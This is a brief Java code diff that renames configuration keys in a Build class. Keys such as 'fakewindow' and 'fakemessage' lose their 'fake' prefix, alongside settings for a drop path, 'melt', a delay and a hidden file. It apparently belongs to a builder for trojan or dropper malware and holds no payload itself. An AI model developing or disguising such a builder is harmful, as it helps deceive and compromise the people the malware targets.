@@ -156,10 +156,10 @@ public class Build {
 				config.put("droppath", droppath);
 				config.put("name", name);
 				config.put("melt", melt);
-				config.put("fakewindow", fakewindow);
-				config.put("fakemessage", fakemessage);
-				config.put("faketitle", faketitle);
-				config.put("fakeicon", fakeicon);
+				config.put("window", fakewindow);
+				config.put("message", fakemessage);
+				config.put("title", faketitle);
+				config.put("icon", fakeicon);
 				config.put("delay", delay);
 				config.put("delayms", delayms);
 				config.put("hiddenfile", hiddenFile);
